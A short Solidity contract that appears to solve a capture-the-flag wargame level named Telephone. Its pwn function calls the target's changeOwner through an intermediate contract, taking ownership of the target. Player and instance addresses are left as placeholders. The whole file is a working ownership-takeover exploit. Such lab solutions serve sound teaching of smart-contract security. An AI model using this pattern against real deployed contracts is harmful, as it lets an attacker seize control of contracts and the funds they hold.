pragma solidity ^0.8.0;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract attackTelephone {
    address telephoneAddress = YOUR_INSTANCE_ADDRESS;
    ITelephone telephoneContract = ITelephone(telephoneAddress);
    
    function pwn() public {
        telephoneContract.changeOwner(YOUR_PLAYER_ADDRESS);
    }
} 